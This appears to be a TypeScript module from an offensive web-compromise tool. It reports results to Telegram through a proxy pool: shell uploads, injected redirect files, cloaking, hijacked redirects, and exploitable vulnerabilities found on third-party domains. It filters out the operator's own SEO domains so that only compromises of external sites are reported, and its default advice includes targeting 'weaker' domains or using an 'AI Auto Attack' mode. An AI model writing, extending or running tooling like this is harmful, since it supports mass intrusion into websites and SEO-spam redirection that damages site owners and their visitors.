/**
 * Telegram Notifier — Send attack results via Telegram Bot API
 * 
 * Replaces email notifications with Telegram messages.
 * Supports:
 * - Success/failure notifications with details
 * - Deployed URLs with clickable links
 * - Pipeline progress updates
 * - Rich formatting with Markdown
 */

import { ENV } from "./_core/env";
import { fetchWithPoolProxy } from "./proxy-pool";
import { shouldSendNotification as verifyRedirectBeforeSend } from "./redirect-verifier";

// Dynamic SEO domain cache — refreshed periodically
let seoDomainsCache: Set<string> = new Set();
let seoDomainsCacheTime = 0;
const SEO_CACHE_TTL = 5 * 60 * 1000; // 5 minutes

async function getSeoAutomationDomains(): Promise<Set<string>> {
  if (Date.now() - seoDomainsCacheTime < SEO_CACHE_TTL && seoDomainsCache.size > 0) {
    return seoDomainsCache;
  }
  try {
    // Lazy import to avoid circular dependency
    const { getUserSeoProjects } = await import("./db");
    const projects = await getUserSeoProjects();
    const domains = new Set<string>();
    for (const p of projects) {
      if (p.domain) {
        // Normalize domain — strip protocol, www, trailing slash
        const clean = p.domain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "").toLowerCase();
        domains.add(clean);
      }
    }
    seoDomainsCache = domains;
    seoDomainsCacheTime = Date.now();
    return domains;
  } catch {
    return seoDomainsCache; // Return stale cache on error
  }
}

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TelegramConfig {
  botToken: string;
  chatId: string;
}

export interface TelegramNotification {
  type: "success" | "failure" | "partial" | "progress" | "info";
  targetUrl: string;
  redirectUrl?: string;
  deployedUrls?: string[];
  shellType?: string;
  duration?: number;
  errors?: string[];
  details?: string;
  keywords?: string[];
  cloakingEnabled?: boolean;
  injectedFiles?: number;
}

interface TelegramSendResult {
  success: boolean;
  messageId?: number;
  error?: string;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM API
// ═══════════════════════════════════════════════════════

async function sendTelegramMessage(
  config: TelegramConfig,
  text: string,
  parseMode: "MarkdownV2" | "HTML" = "HTML",
): Promise<TelegramSendResult> {
  try {
    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
    
    const { response } = await fetchWithPoolProxy(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: config.chatId,
        text,
        parse_mode: parseMode,
        disable_web_page_preview: false,
      }),
      signal: AbortSignal.timeout(10000),
    }, { targetDomain: "api.telegram.org", timeout: 10000 });

    const result = await response.json() as any;
    
    if (result.ok) {
      return { success: true, messageId: result.result?.message_id };
    } else {
      return { success: false, error: result.description || "Unknown Telegram API error" };
    }
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

// ═══════════════════════════════════════════════════════
//  GET CONFIG FROM ENV
// ═══════════════════════════════════════════════════════

export function getTelegramConfig(): TelegramConfig | null {
  const botToken = ENV.telegramBotToken;
  const chatId = ENV.telegramChatId;
  
  if (!botToken || !chatId) {
    return null;
  }
  
  return { botToken, chatId };
}

// ═══════════════════════════════════════════════════════
//  NOTIFICATION FORMATTERS
// ═══════════════════════════════════════════════════════

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function formatSuccessMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🎯 <b>ATTACK SUCCESS</b> 🎯");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("✅ <b>Deployed URLs:</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.shellType) {
    lines.push(`🐚 <b>Shell Type:</b> ${escapeHtml(notification.shellType)}`);
  }
  
  if (notification.keywords && notification.keywords.length > 0) {
    lines.push(`🔑 <b>Keywords:</b> ${notification.keywords.map(k => escapeHtml(k)).join(", ")}`);
  }
  
  if (notification.cloakingEnabled) {
    lines.push(`🎭 <b>Cloaking:</b> Active`);
    if (notification.injectedFiles && notification.injectedFiles > 0) {
      lines.push(`💉 <b>Injected Files:</b> ${notification.injectedFiles}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatFailureMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("❌ <b>ATTACK FAILED</b> ❌");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.errors && notification.errors.length > 0) {
    lines.push("");
    lines.push("⚠️ <b>Errors:</b>");
    for (const err of notification.errors.slice(0, 5)) {
      lines.push(`  • ${escapeHtml(err.substring(0, 100))}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatPartialMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("⚠️ <b>PARTIAL SUCCESS</b> ⚠️");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("📁 <b>Files Uploaded (redirect not verified):</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatProgressMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🔄 <b>PIPELINE PROGRESS</b>");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.details) {
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

// ═══════════════════════════════════════════════════════
//  MAIN: Send Notification
// ═══════════════════════════════════════════════════════

export async function sendTelegramNotification(
  notification: TelegramNotification,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)" };
  }

  // ═══ STRICT ATTACK-SUCCESS-ONLY FILTER ═══
  // ONLY send notifications for REAL attack successes where:
  // 1. Type is "success"
  // 2. Has deployedUrls with actual URLs (verified redirect/file placement)
  // 3. Target is NOT an SEO automation domain (our own domains)
  // Block EVERYTHING else: info, progress, partial, failure, freshness, distribution, CVE, orchestrator, etc.
  
  // Block all non-success types immediately
  if (notification.type !== "success") {
    console.log(`[Telegram] Blocked ${notification.type} notification for ${notification.targetUrl} (attack-success-only mode)`);
    return { success: true };
  }

  // Block success notifications that are NOT real attacks (no deployed URLs = not a real attack)
  const hasDeployedUrls = notification.deployedUrls && notification.deployedUrls.length > 0;
  const hasRedirectUrl = !!notification.redirectUrl;
  
  // Must have either deployed URLs or redirect URL to prove it's a real attack
  if (!hasDeployedUrls && !hasRedirectUrl) {
    // Check if details contain attack-like indicators
    const details = (notification.details || "").toLowerCase();
    const isRealAttack = details.includes("deployed") || details.includes("injected") || details.includes("redirect") || details.includes("shell");
    if (!isRealAttack) {
      console.log(`[Telegram] Blocked success notification for ${notification.targetUrl} — no deployed URLs or redirect (not a real attack)`);
      return { success: true };
    }
  }

  // Block SEO automation domains (our own domains, not attack targets)
  // These are domains we manage via SEO Automation, not domains we attack
  const targetLower = (notification.targetUrl || "").toLowerCase();
  const detailsLower = (notification.details || "").toLowerCase();
  
  // Block non-attack notifications disguised as success
  const NON_ATTACK_KEYWORDS = [
    "freshness cycle",
    "multi-platform distribution",
    "platform discovery",
    "auto-post",
    "campaign for",
    "agentic seo",
    "ooda cycle",
    "cve database",
    "auto-remediation",
    "proxy",
    "health check",
    "pbn expire",
    "pbn network",
    "auto-started",
  ];
  
  for (const keyword of NON_ATTACK_KEYWORDS) {
    if (detailsLower.includes(keyword) || targetLower.includes(keyword)) {
      console.log(`[Telegram] Blocked non-attack success for ${notification.targetUrl} — matched filter: "${keyword}"`);
      return { success: true };
    }
  }

  // Block system/internal targets (not real external attack targets)
  const SYSTEM_TARGETS = [
    "orchestrator", "auto-pipeline", "cve database", "pbn network",
    "proxy-health-check", "system", "agentic session",
  ];
  
  for (const sys of SYSTEM_TARGETS) {
    if (targetLower.includes(sys)) {
      console.log(`[Telegram] Blocked system target notification: ${notification.targetUrl}`);
      return { success: true };
    }
  }

  // Dynamic filter: Block notifications for domains in our SEO Automation system
  // These are OUR domains that we manage, not external attack targets
  try {
    const seoDomains = await getSeoAutomationDomains();
    const cleanTarget = targetLower.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "");
    if (seoDomains.has(cleanTarget)) {
      console.log(`[Telegram] Blocked SEO automation domain: ${notification.targetUrl} (this is our own domain)`);
      return { success: true };
    }
    // Also check partial match (e.g., "tos1688.org" in "https://tos1688.org/path")
    const seoDomainsArr = Array.from(seoDomains);
    for (const seoDomain of seoDomainsArr) {
      if (cleanTarget.includes(seoDomain) || seoDomain.includes(cleanTarget)) {
        console.log(`[Telegram] Blocked SEO automation domain (partial match): ${notification.targetUrl} ~ ${seoDomain}`);
        return { success: true };
      }
    }
  } catch {
    // Non-critical — continue sending if DB check fails
  }

  // ═══ REDIRECT VERIFICATION GATE ═══
  // Before sending, verify that deployed URLs actually work and redirect correctly
  if (hasDeployedUrls) {
    try {
      console.log(`[Telegram] Verifying ${notification.deployedUrls!.length} deployed URL(s) before sending...`);
      const verification = await verifyRedirectBeforeSend(
        notification.deployedUrls!,
        notification.redirectUrl || null,
      );

      if (!verification.shouldSend) {
        console.log(`[Telegram] ❌ Redirect verification FAILED for ${notification.targetUrl} — ${verification.verificationSummary}`);
        console.log(`[Telegram] Blocking notification: 0/${verification.totalCount} URLs verified`);
        return { success: true }; // Silently block — don't send unverified attacks
      }

      console.log(`[Telegram] ✅ Redirect verification PASSED: ${verification.verifiedCount}/${verification.totalCount} URLs verified`);
      
      // Enrich the notification with verification data
      if (verification.redirectChainText) {
        notification.details = [
          notification.details || "",
          `\n🔍 Redirect Verified: ${verification.verifiedCount}/${verification.totalCount}`,
          verification.redirectChainText,
        ].filter(Boolean).join("\n");
      }
    } catch (verifyErr: any) {
      // Verification engine error — still send the notification but log warning
      console.warn(`[Telegram] ⚠️ Redirect verification error (sending anyway): ${verifyErr.message}`);
    }
  }

  // If we get here, it's a real, verified attack success — send it!
  console.log(`[Telegram] ✅ Sending VERIFIED attack success for ${notification.targetUrl}`);

  // Only success type reaches here (all others are filtered above)
  const message = formatSuccessMessage(notification);

  return sendTelegramMessage(config, message, "HTML");
}

// ═══════════════════════════════════════════════════════
//  BATCH NOTIFICATION
// ═══════════════════════════════════════════════════════

/**
 * Send a batch summary notification for multiple targets
 */
export async function sendBatchSummary(
  results: Array<{
    targetUrl: string;
    success: boolean;
    deployedUrls: string[];
    errors: string[];
  }>,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured" };
  }
  // SUCCESS-ONLY: Only include successful results in batch summary
  const successResults = results.filter(r => r.success);
  
  // Skip batch summary entirely if no successes
  if (successResults.length === 0) {
    console.log(`[Telegram] Skipping batch summary — 0 successes out of ${results.length} targets`);
    return { success: true };
  }
  
  const lines: string[] = [];
  lines.push("📊 <b>BATCH ATTACK SUMMARY</b> 📊");
  lines.push("");
  lines.push(`✅ Success: ${successResults.length} / ${results.length} targets`);
  lines.push("");
  
  
  for (const result of successResults) {
    lines.push(`✅ ${escapeHtml(result.targetUrl)}`);
    if (result.deployedUrls.length > 0) {
      for (const url of result.deployedUrls.slice(0, 2)) {
        lines.push(`  └ <a href="${escapeHtml(url)}">${escapeHtml(url.substring(0, 50))}...</a>`);
      }
    }
  } 
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return sendTelegramMessage(config, lines.join("\n"), "HTML");
}

// ═══════════════════════════════════════════════════════
//  VERIFY BOT TOKEN
// ═══════════════════════════════════════════════════════

export async function verifyTelegramBot(botToken: string): Promise<{ valid: boolean; botName?: string; error?: string }> {
  try {
    const url = `https://api.telegram.org/bot${botToken}/getMe`;
    const { response } = await fetchWithPoolProxy(url, { signal: AbortSignal.timeout(5000) }, { targetDomain: "api.telegram.org", timeout: 5000 });
    const result = await response.json() as any;
    
    if (result.ok) {
      return { valid: true, botName: result.result?.username };
    } else {
      return { valid: false, error: result.description };
    }
  } catch (error: any) {
    return { valid: false, error: error.message };
  }
}


// ═══════════════════════════════════════════════════════
//  VULNERABILITY ALERT — Send alerts when High/Exploitable vulns found
// ═══════════════════════════════════════════════════════

export interface VulnAlertData {
  domain: string;
  serverInfo?: string;
  cms?: string;
  highVulns: Array<{ name?: string; check?: string; severity: string; detail?: string }>;
  exploitableVulns: Array<{ name?: string; check?: string; detail?: string }>;
  writablePaths?: number;
  attackVectors?: Array<{ name: string; successProbability?: number }>;
  context?: string; // e.g. "กำลังโจมตีอัตโนมัติ..." or "Scan Only"
}

/**
 * Send vulnerability alert to all configured Telegram chat IDs.
 * Called from both full_chain (telegram-ai-agent) and unified-attack-pipeline.
 */
export async function sendVulnAlert(data: VulnAlertData): Promise<boolean> {
  const config = getTelegramConfig();
  if (!config) return false;

  const alertLines: string[] = [
    `🚨 <b>แจ้งเตือนช่องโหว่ร้ายแรง!</b>`,
    ``,
    `🎯 Domain: <code>${escapeHtml(data.domain)}</code>`,
    `🖥️ Server: ${escapeHtml(data.serverInfo || "unknown")}`,
    `📝 CMS: ${escapeHtml(data.cms || "unknown")}`,
    ``,
  ];

  if (data.highVulns.length > 0) {
    alertLines.push(`🔴 <b>High/Critical: ${data.highVulns.length} ช่องโหว่</b>`);
    data.highVulns.slice(0, 5).forEach((v, i) => {
      alertLines.push(`  ${i + 1}. ${escapeHtml(v.name || v.check || "Unknown")} (${escapeHtml(v.severity)})`);
    });
    if (data.highVulns.length > 5) alertLines.push(`  ... และอีก ${data.highVulns.length - 5} รายการ`);
    alertLines.push(``);
  }

  if (data.exploitableVulns.length > 0) {
    alertLines.push(`💥 <b>Exploitable: ${data.exploitableVulns.length} ช่องโหว่</b>`);
    data.exploitableVulns.slice(0, 5).forEach((v, i) => {
      alertLines.push(`  ${i + 1}. ${escapeHtml(v.name || v.check || "Unknown")} — ${escapeHtml((v.detail || "").substring(0, 60))}`);
    });
    if (data.exploitableVulns.length > 5) alertLines.push(`  ... และอีก ${data.exploitableVulns.length - 5} รายการ`);
    alertLines.push(``);
  }

  if (data.writablePaths && data.writablePaths > 0) {
    alertLines.push(`📂 Writable paths: ${data.writablePaths}`);
  }
  if (data.attackVectors && data.attackVectors.length > 0) {
    alertLines.push(`🎯 Attack vectors: ${data.attackVectors.length}`);
    alertLines.push(``);
    alertLines.push(`Top vectors:`);
    data.attackVectors.slice(0, 3).forEach((v, i) => {
      alertLines.push(`  ${i + 1}. ${escapeHtml(v.name)} (${Math.round((v.successProbability || 0) * 100)}%)`);
    });
  }

  if (data.context) {
    alertLines.push(``);
    alertLines.push(`⚔️ ${escapeHtml(data.context)}`);
  }

  const message = alertLines.join("\n");

  // Send to all configured chat IDs
  const chatIds: string[] = [config.chatId];
  if (ENV.telegramChatId2) chatIds.push(ENV.telegramChatId2);
  if (ENV.telegramChatId3) chatIds.push(ENV.telegramChatId3);

  let anySent = false;
  for (const chatId of chatIds) {
    try {
      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
      const { response } = await fetchWithPoolProxy(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
        signal: AbortSignal.timeout(10000),
      }, { targetDomain: "api.telegram.org", timeout: 10000 });
      const result = await response.json() as any;
      if (result.ok) anySent = true;
    } catch (err) {
      console.warn(`[Telegram] Failed to send vuln alert to chat ${chatId}: ${err}`);
    }
  }

  return anySent;
}

// ═══════════════════════════════════════════════════════
//  ATTACK SUCCESS ALERT — sent when shell upload / redirect / exploit succeeds
// ═══════════════════════════════════════════════════════

export interface AttackSuccessData {
  domain: string;
  method: string;            // e.g. "full_chain", "cloaking_inject", "hijack_redirect", "agentic_auto", "pipeline"
  successMethod: string;     // specific technique that worked, e.g. "wp_plugin_upload", "ftp_access"
  redirectUrl?: string;      // the redirect destination
  uploadedUrl?: string;      // the deployed file URL
  verified?: boolean;        // whether redirect was verified to work
  durationMs?: number;       // how long the attack took
  details?: string;          // extra context
  // Shodan/SSH/FTP intelligence
  shodanPorts?: string;      // e.g. "21,22,80,443,2083"
  sshUsed?: boolean;         // whether SSH was used for upload
  ftpUsed?: boolean;         // whether FTP was used for upload
}

/**
 * Send attack success alert to all configured Telegram chat IDs.
 * Called immediately when an attack succeeds (shell upload, redirect placement, exploit, etc.)
 */
export async function sendAttackSuccessAlert(data: AttackSuccessData): Promise<boolean> {
  const config = getTelegramConfig();
  if (!config) return false;

  const durationStr = data.durationMs
    ? `${(data.durationMs / 1000).toFixed(1)}s`
    : "N/A";

  const alertLines: string[] = [
    `🎉 <b>โจมตีสำเร็จ!</b>`,
    ``,
    `🎯 Domain: <code>${escapeHtml(data.domain)}</code>`,
    `⚔️ Mode: <b>${escapeHtml(data.method)}</b>`,
    `🔧 Method: <b>${escapeHtml(data.successMethod)}</b>`,
    `⏱ Duration: ${escapeHtml(durationStr)}`,
    ``,
  ];

  if (data.uploadedUrl) {
    alertLines.push(`📁 Deployed: <code>${escapeHtml(data.uploadedUrl.substring(0, 120))}</code>`);
  }
  if (data.redirectUrl) {
    alertLines.push(`🔀 Redirect → <code>${escapeHtml(data.redirectUrl.substring(0, 100))}</code>`);
  }
  if (data.verified !== undefined) {
    alertLines.push(`✅ Verified: ${data.verified ? "redirect ทำงานจริง ✅" : "ยังไม่ยืนยัน ⚠️"}`);
  }
  if (data.shodanPorts) {
    alertLines.push(`\ud83d\udd0d Shodan: ports ${escapeHtml(data.shodanPorts)}`);
  }
  if (data.sshUsed) {
    alertLines.push(`\ud83d\udd10 SSH/SFTP upload \u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e42\u0e08\u0e21\u0e15\u0e35\u0e04\u0e23\u0e31\u0e49\u0e07\u0e19\u0e35\u0e49`);
  }
  if (data.ftpUsed) {
    alertLines.push(`\ud83d\udcc2 FTP upload \u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e42\u0e08\u0e21\u0e15\u0e35\u0e04\u0e23\u0e31\u0e49\u0e07\u0e19\u0e35\u0e49`);
  }
  if (data.details) {
    alertLines.push(``);
    alertLines.push(`\ud83d\udcdd ${escapeHtml(data.details.substring(0, 200))}`);
  }

  const message = alertLines.join("\n");

  // Send to all configured chat IDs
  const chatIds: string[] = [config.chatId];
  if (ENV.telegramChatId2) chatIds.push(ENV.telegramChatId2);
  if (ENV.telegramChatId3) chatIds.push(ENV.telegramChatId3);

  let anySent = false;
  for (const chatId of chatIds) {
    try {
      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
      const { response } = await fetchWithPoolProxy(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
        signal: AbortSignal.timeout(10000),
      }, { targetDomain: "api.telegram.org", timeout: 10000 });
      const result = await response.json() as any;
      if (result.ok) anySent = true;
    } catch (err) {
      console.warn(`[Telegram] Failed to send attack success alert to chat ${chatId}: ${err}`);
    }
  }

  if (anySent) {
    console.log(`[Telegram] 🎉 Attack success alert sent for ${data.domain} via ${data.successMethod}`);
  }

  return anySent;
}


// ═══ FAILURE SUMMARY ALERT ═══

export interface MethodAttempt {
  name: string;           // method name e.g. "wp_plugin_upload", "ftp_access"
  status: "failed" | "timeout" | "skipped" | "error";
  reason?: string;        // why it failed e.g. "403 Forbidden", "Connection timeout"
  durationMs?: number;    // how long this method took
}

export interface FailureSummaryData {
  domain: string;
  mode: string;                    // e.g. "full_chain", "redirect_only", "cloaking_inject", "hijack_redirect", "agentic_auto", "pipeline"
  totalDurationMs?: number;        // total attack duration
  methods: MethodAttempt[];        // all methods attempted
  serverInfo?: string;             // e.g. "nginx/1.18 (Cloudflare)"
  cms?: string;                    // e.g. "WordPress 6.4"
  vulnCount?: number;              // number of vulns found
  recommendations?: string[];      // AI-generated next steps
}

/**
 * Send failure summary alert to all configured Telegram chat IDs.
 * Called when ALL attack methods fail — provides a detailed breakdown.
 */
export async function sendFailureSummaryAlert(data: FailureSummaryData): Promise<boolean> {
  const config = getTelegramConfig();
  if (!config) return false;

  const durationStr = data.totalDurationMs
    ? `${(data.totalDurationMs / 1000 / 60).toFixed(1)} นาที`
    : "N/A";

  // Count by status
  const failed = data.methods.filter(m => m.status === "failed");
  const timedOut = data.methods.filter(m => m.status === "timeout");
  const errored = data.methods.filter(m => m.status === "error");
  const skipped = data.methods.filter(m => m.status === "skipped");

  const alertLines: string[] = [
    `❌ <b>โจมตีล้มเหลว — ทุกวิธีไม่สำเร็จ</b>`,
    ``,
    `🎯 Domain: <code>${escapeHtml(data.domain)}</code>`,
    `⚔️ Mode: <b>${escapeHtml(data.mode)}</b>`,
    `⏱ ใช้เวลาทั้งหมด: ${escapeHtml(durationStr)}`,
    `📊 ลองแล้ว: <b>${data.methods.length} วิธี</b>`,
    ``,
  ];

  // Server/CMS info
  if (data.serverInfo || data.cms) {
    alertLines.push(`🖥️ Server: ${escapeHtml(data.serverInfo || "Unknown")} | CMS: ${escapeHtml(data.cms || "Unknown")}`);
  }
  if (data.vulnCount !== undefined) {
    alertLines.push(`🔍 ช่องโหว่ที่พบ: ${data.vulnCount}`);
  }
  alertLines.push(``);

  // Status summary
  const statusParts: string[] = [];
  if (failed.length > 0) statusParts.push(`❌ ล้มเหลว: ${failed.length}`);
  if (timedOut.length > 0) statusParts.push(`⏰ หมดเวลา: ${timedOut.length}`);
  if (errored.length > 0) statusParts.push(`💥 Error: ${errored.length}`);
  if (skipped.length > 0) statusParts.push(`⏭ ข้าม: ${skipped.length}`);
  if (statusParts.length > 0) {
    alertLines.push(statusParts.join(" | "));
    alertLines.push(``);
  }

  // Method details (max 8 to avoid message too long)
  alertLines.push(`<b>📋 รายละเอียดแต่ละวิธี:</b>`);
  const displayMethods = data.methods.slice(0, 8);
  for (const m of displayMethods) {
    const statusIcon = m.status === "timeout" ? "⏰" : m.status === "skipped" ? "⏭" : m.status === "error" ? "💥" : "❌";
    const dur = m.durationMs ? ` (${(m.durationMs / 1000).toFixed(0)}s)` : "";
    const reason = m.reason ? ` — ${m.reason.substring(0, 60)}` : "";
    alertLines.push(`${statusIcon} <code>${escapeHtml(m.name)}</code>${dur}${escapeHtml(reason)}`);
  }
  if (data.methods.length > 8) {
    alertLines.push(`... และอีก ${data.methods.length - 8} วิธี`);
  }

  // Recommendations
  if (data.recommendations && data.recommendations.length > 0) {
    alertLines.push(``);
    alertLines.push(`<b>💡 แนะนำ:</b>`);
    for (const rec of data.recommendations.slice(0, 4)) {
      alertLines.push(`• ${escapeHtml(rec.substring(0, 100))}`);
    }
  } else {
    // Default recommendations
    alertLines.push(``);
    alertLines.push(`<b>💡 แนะนำ:</b>`);
    alertLines.push(`• ลอง /scan ${escapeHtml(data.domain)} เพื่อวิเคราะห์ใหม่`);
    alertLines.push(`• ลองส่ง domain อื่นที่อ่อนแอกว่า`);
    if (data.mode !== "agentic_auto") {
      alertLines.push(`• ลอง AI Auto Attack เพื่อให้ AI หาวิธีเอง`);
    }
  }

  const message = alertLines.join("\n");

  // Send to all configured chat IDs
  const chatIds: string[] = [config.chatId];
  if (ENV.telegramChatId2) chatIds.push(ENV.telegramChatId2);
  if (ENV.telegramChatId3) chatIds.push(ENV.telegramChatId3);

  let anySent = false;
  for (const chatId of chatIds) {
    try {
      const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
      const { response } = await fetchWithPoolProxy(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
        signal: AbortSignal.timeout(10000),
      }, { targetDomain: "api.telegram.org", timeout: 10000 });
      const result = await response.json() as any;
      if (result.ok) anySent = true;
    } catch (err) {
      console.warn(`[Telegram] Failed to send failure summary alert to chat ${chatId}: ${err}`);
    }
  }

  if (anySent) {
    console.log(`[Telegram] ❌ Failure summary alert sent for ${data.domain} (${data.mode}, ${data.methods.length} methods tried)`);
  }

  return anySent;
}
